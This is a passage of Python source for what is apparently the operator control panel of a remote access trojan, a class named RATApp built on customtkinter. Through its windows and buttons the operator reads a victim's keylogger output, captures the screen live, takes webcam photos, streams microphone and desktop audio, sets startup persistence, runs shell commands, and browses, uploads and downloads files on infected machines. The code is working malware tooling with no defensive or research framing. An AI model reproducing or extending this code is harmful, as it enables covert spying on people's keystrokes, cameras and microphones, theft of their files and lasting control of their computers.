        box.pack(fill="both", expand=True, padx=5, pady=5)

        stop_evt = Event()

        def poll():
            while not stop_evt.is_set():
                time.sleep(1)
                logs = self.send_cmd(c, "get_keylog")
                if logs.startswith("[CLIENT]") or logs == "Connection lost.":
                    continue
                box.delete("0.0", "end")
                box.insert("end", logs)

        Thread(target=poll, daemon=True).start()

        def on_cl():
            stop_evt.set()
            time.sleep(0.2)
            sp = self.send_cmd(c, "stop_keylog")
            print("Keylogger stop:", sp)
            w.destroy()

        w.protocol("WM_DELETE_WINDOW", on_cl)

    def take_screenshot(self):
        """
        Use the RAT command "screenshot" (not 'shell screenshot').
        """
        c = self.get_sel_client()
        if not c:
            return
        r = self.send_cmd(c, "screenshot")
        if r.startswith("[SCREENSHOT_DATA]"):
            b64d = r[len("[SCREENSHOT_DATA]"):]
            try:
                raw = base64.b64decode(b64d)
                im = Image.open(io.BytesIO(raw))
            except Exception as e:
                messagebox.showerror("Screenshot Error", f"Decode error: {e}")
                return
            w = ctk.CTkToplevel(self)
            w.title(f"Screenshot - {c}")
            im_w, im_h = im.size
            w.geometry(f"{im_w}x{im_h}")

            tkimg = ImageTk.PhotoImage(im)
            lb = ctk.CTkLabel(w, text="")
            lb.pack()
            lb.configure(image=tkimg)
            lb.image = tkimg
        else:
            messagebox.showerror("Screenshot Error", r)

    def open_live_screen_jpeg_window(self):
        c = self.get_sel_client()
        if not c:
            return

        w = ctk.CTkToplevel(self)
        w.title(f"Live Screen - {c}")
        w.geometry("600x500")

        lb = ctk.CTkLabel(w, text="")
        lb.pack()

        bottom = ctk.CTkFrame(w)
        bottom.pack(fill="x")

        ctk.CTkLabel(bottom, text="Quality (10-100):").pack(side="left", padx=5)
        quality_var = ctk.IntVar(value=80)
        qual_slider = ctk.CTkSlider(bottom, from_=10, to=100, number_of_steps=90, variable=quality_var)
        qual_slider.pack(side="left", fill="x", expand=True, padx=5)

        ctk.CTkLabel(bottom, text="FPS (1-50):").pack(side="left", padx=5)
        fps_var = ctk.IntVar(value=10)
        fps_slider = ctk.CTkSlider(bottom, from_=1, to=50, number_of_steps=49, variable=fps_var)
        fps_slider.pack(side="left", fill="x", expand=True, padx=5)

        st = Event()
        self.screen_view_events[c] = st

        def poll():
            while not st.is_set():
                q = quality_var.get()
                f = fps_var.get()
                cmd = f"live_screen_jpeg {q}"
                resp = self.send_cmd(c, cmd)
                if resp.startswith("[SCREENSHOT_DATA]"):
                    b64d = resp[len("[SCREENSHOT_DATA]"):]
                    try:
                        raw = base64.b64decode(b64d)
                        im = Image.open(io.BytesIO(raw))
                    except Exception as e:
                        print("Live screen decode error:", e)
                        continue
                    tim = ImageTk.PhotoImage(im)
                    lb.configure(image=tim)
                    lb.image = tim
                else:
                    print(resp)
                time.sleep(1.0 / f if f > 0 else 0.1)

        Thread(target=poll, daemon=True).start()

        def on_cl():
            st.set()
            time.sleep(0.2)
            w.destroy()

        w.protocol("WM_DELETE_WINDOW", on_cl)

    def send_message_box(self):
        c = self.get_sel_client()
        if not c:
            return
        msg = simpledialog.askstring("Send Message", "Enter message to send to client:")
        if msg is None:
            return
        r = self.send_cmd(c, f"send_msg {msg}")
        print("send_msg response:", r)

    def add_startup(self):
        c = self.get_sel_client()
        if not c:
            return
        r = self.send_cmd(c, "add_startup")
        print("Add Startup:", r)

    def remove_startup(self):
        c = self.get_sel_client()
        if not c:
            return
        r = self.send_cmd(c, "remove_startup")
        print("Remove Startup:", r)

    def upload_file(self):
        c = self.get_sel_client()
        if not c:
            return
        local = filedialog.askopenfilename()
        if not local:
            return
        remot = simpledialog.askstring("Remote file", "Enter full remote path:")
        if not remot:
            return
        try:
            with open(local, "rb") as f:
                raw = f.read()
            enc = encrypt_data(raw)
            b64enc = base64.b64encode(enc).decode("utf-8")
            cmd = f'upload "{remot}" {b64enc}'
            resp = self.send_cmd(c, cmd)
            print("Upload resp:", resp)
        except Exception as e:
            print("Upload error:", e)

    def file_manager(self):
        c = self.get_sel_client()
        if not c:
            return

        fm_win = ctk.CTkToplevel(self)
        fm_win.title(f"File Manager - {c}")
        fm_win.geometry("700x500")

        top_frame = ctk.CTkFrame(fm_win)
        top_frame.pack(fill="x", padx=5, pady=5)

        self.fm_path_var = ctk.StringVar(value="C:\\")
        path_entry = ctk.CTkEntry(top_frame, textvariable=self.fm_path_var)
        path_entry.pack(side="left", fill="x", expand=True, padx=5)

        def go_path():
            self.fm_refresh_file_list(c, tree, self.fm_path_var.get())

        go_btn = ctk.CTkButton(top_frame, text="Go", command=go_path)
        go_btn.pack(side="left", padx=5)

        def up_dir():
            cur = self.fm_path_var.get()
            newp = os.path.dirname(cur.rstrip("\\/ "))
            if newp and newp != cur:
                self.fm_path_var.set(newp)
                self.fm_refresh_file_list(c, tree, newp)

        up_btn = ctk.CTkButton(top_frame, text="Up", command=up_dir)
        up_btn.pack(side="left", padx=5)

        tree_frame = ctk.CTkFrame(fm_win)
        tree_frame.pack(fill="both", expand=True)

        style = ttk.Style()
        style.theme_use("clam")
        style.configure("Treeview", background="#2B2B2B", foreground="white", fieldbackground="#2B2B2B")
        style.map("Treeview", background=[("selected", "#0078D7")], foreground=[("selected", "white")])

        columns = ("#0",)
        tree = ttk.Treeview(tree_frame, columns=columns, show="tree")
        tree.pack(fill="both", expand=True)

        self.fm_items = {}

        def on_double_click(event):
            sel = tree.selection()
            if not sel:
                return
            iid = sel[0]
            is_dir, fullp = self.fm_items.get(iid, (False, ""))
            if is_dir:
                self.fm_path_var.set(fullp)
                self.fm_refresh_file_list(c, tree, fullp)
            else:
                ans = messagebox.askyesno("Download?", f"Download '{fullp}'?")
                if ans:
                    savep = filedialog.asksaveasfilename()
                    if savep:
                        resp = self.send_cmd(c, f'download "{fullp}"')
                        if resp.startswith("[DOWNLOAD_DATA]"):
                            b64d = resp[len("[DOWNLOAD_DATA]"):]
                            try:
                                dec = decrypt_data(base64.b64decode(b64d))
                                with open(savep, "wb") as ff:
                                    ff.write(dec)
                                messagebox.showinfo("Downloaded", f"Saved => {savep}")
                            except Exception as ex:
                                messagebox.showerror("Error", f"Decode error: {ex}")
                        else:
                            messagebox.showerror("Download error", resp)

        tree.bind("<Double-1>", on_double_click)

        self.fm_refresh_file_list(c, tree, self.fm_path_var.get())

    def fm_refresh_file_list(self, client_key, tree, path_val):
        for item in tree.get_children():
            tree.delete(item)
        self.fm_items.clear()

        listing = self.send_cmd(client_key, f'dirb "{path_val}"')
        if not listing:
            return
        lines = listing.splitlines()

        for it in lines:
            it = it.strip()
            if not it:
                continue
            # Full path
            fullp = os.path.join(path_val.rstrip("\\/ "), it)
            # Check if directory
            check_cmd = f'if exist "{fullp}\\." (echo dir) else (echo file)'
            # Use the "shell" command in our RAT protocol
            result = self.send_cmd(client_key, f"shell {check_cmd}").strip().lower()
            is_dir = "dir" in result
            iid = tree.insert("", "end", text=it)
            self.fm_items[iid] = (is_dir, os.path.abspath(fullp))

    def webcam_photo(self):
        c = self.get_sel_client()
        if not c:
            return
        r = self.send_cmd(c, "webcam_photo")
        if r.startswith("[WEBCAM_DATA]"):
            b64d = r[len("[WEBCAM_DATA]"):]
            try:
                raw = base64.b64decode(b64d)
                im = Image.open(io.BytesIO(raw))
                w = ctk.CTkToplevel(self)
                w.title(f"Webcam Photo - {c}")
                w.geometry("400x300")
                tkimg = ImageTk.PhotoImage(im)
                lb = ctk.CTkLabel(w, text="")
                lb.pack()
                lb.configure(image=tkimg)
                lb.image = tkimg
            except Exception as e:
                print("Webcam decode error:", e)
        else:
            print(r)

    def live_mic_stream(self):
        c = self.get_sel_client()
        if not c:
            return
        win = ctk.CTkToplevel(self)
        win.title(f"Live Mic Stream - {c}")
        win.geometry("400x200")
        ctk.CTkLabel(win, text="Click Start to stream mic audio").pack(pady=10)
        streaming = [False]
        import pyaudio
        p = pyaudio.PyAudio()
        try:
            stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, output=True)
        except Exception as e:
            messagebox.showerror("Mic Error", f"Cannot open PyAudio stream: {e}")
            return

        def start_stream():
            if streaming[0]:
                return
            streaming[0] = True

            def stream_thread():
                while streaming[0]:
                    resp = self.send_cmd(c, "mic_record 1")
                    if resp.startswith("[MIC_DATA]"):
                        b64d = resp[len("[MIC_DATA]"):]
                        try:
                            dec = decrypt_data(base64.b64decode(b64d))
                            try:
                                stream.write(dec)
                            except Exception as ex:
                                print("Mic stream write error:", ex)
                                break
                        except Exception as ex:
                            print("Mic decode error:", ex)
                    else:
                        print("Mic stream error:", resp)
                streaming[0] = False

            Thread(target=stream_thread, daemon=True).start()

        def stop_stream():
            streaming[0] = False
            time.sleep(0.2)
            try:
                stream.stop_stream()
            except:
                pass
            try:
                stream.close()
            except:
                pass
            try:
                p.terminate()
            except:
                pass

        start_btn = ctk.CTkButton(win, text="Start", command=start_stream)
        start_btn.pack(pady=5)
        stop_btn = ctk.CTkButton(win, text="Stop", command=stop_stream)
        stop_btn.pack(pady=5)

    def live_desktop_stream(self):
        c = self.get_sel_client()
        if not c:
            return
        win = ctk.CTkToplevel(self)
        win.title(f"Live Desktop Audio Stream - {c}")
        win.geometry("400x200")
        ctk.CTkLabel(win, text="Click Start to stream desktop audio").pack(pady=10)
        streaming = [False]
        import pyaudio
        p = pyaudio.PyAudio()
        try:
            stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, output=True)
        except Exception as e:
            messagebox.showerror("Desktop Audio Error", f"Cannot open PyAudio stream: {e}")
            return

        def start_stream():
            if streaming[0]:
                return
            streaming[0] = True

            def stream_thread():
                while streaming[0]:
                    resp = self.send_cmd(c, "desktop_audio 1")
                    if resp.startswith("[DESKTOP_AUDIO]"):
                        b64d = resp[len("[DESKTOP_AUDIO]"):]
                        try:
                            dec = decrypt_data(base64.b64decode(b64d))
                            try:
                                stream.write(dec)
                            except Exception as ex:
                                print("Desktop audio stream write error:", ex)
                                break
                        except Exception as e:
                            print("Desktop audio decode error:", e)
                    else:
                        print("Desktop audio stream error:", resp)
                streaming[0] = False

            Thread(target=stream_thread, daemon=True).start()

        def stop_stream():
            streaming[0] = False
            time.sleep(0.2)
            try:
                stream.stop_stream()
            except:
                pass
            try:
                stream.close()
            except:
                pass
            try:
                p.terminate()
            except:
                pass

        start_btn = ctk.CTkButton(win, text="Start", command=start_stream)
        start_btn.pack(pady=5)
        stop_btn = ctk.CTkButton(win, text="Stop", command=stop_stream)
        stop_btn.pack(pady=5)

    def open_server_chat_window(self):
        c = self.get_sel_client()
        if not c:
            return

        w = ctk.CTkToplevel(self)
        w.title(f"Live Chat - {c}")
        w.geometry("600x400")

        txt = ctk.CTkTextbox(w, wrap="word")
        txt.pack(side="top", fill="both", expand=True, padx=5, pady=5)

        bottom_frame = ctk.CTkFrame(w)
        bottom_frame.pack(side="bottom", fill="x")

        e = ctk.CTkEntry(bottom_frame, placeholder_text="Type a message")
        e.pack(side="left", fill="x", expand=True, padx=5, pady=5)

        def send_chat():
            msg = e.get().strip()
            if not msg:
                return
            r = self.send_cmd(c, f"chat_msg {msg}")
            txt.insert("end", f"Server: {msg}\n")
            txt.see("end")
            e.delete(0, "end")

        send_btn = ctk.CTkButton(bottom_frame, text="Send", command=send_chat)
        send_btn.pack(side="left", padx=5)

        r = self.send_cmd(c, "chat_on")
        txt.insert("end", f"(Sent 'chat_on' to client) => {r}\n")

        self.chat_windows[c] = (w, txt)

        def on_close():
            self.send_cmd(c, "chat_off")
            w.destroy()
            del self.chat_windows[c]

        w.protocol("WM_DELETE_WINDOW", on_close)

    def show_system_info(self):
        c = self.get_sel_client()
        if not c:
            return
        info = self.send_cmd(c, "system_info")
        w = ctk.CTkToplevel(self)
        w.title(f"System Information - {c}")
        w.geometry("600x500")
        txt = ctk.CTkTextbox(w, wrap="word")
        txt.pack(fill="both", expand=True, padx=5, pady=5)
        txt.insert("end", info)


##############################################################################
# MAIN
##############################################################################
if __name__ == "__main__":
    app = RATApp()
    app.mainloop()
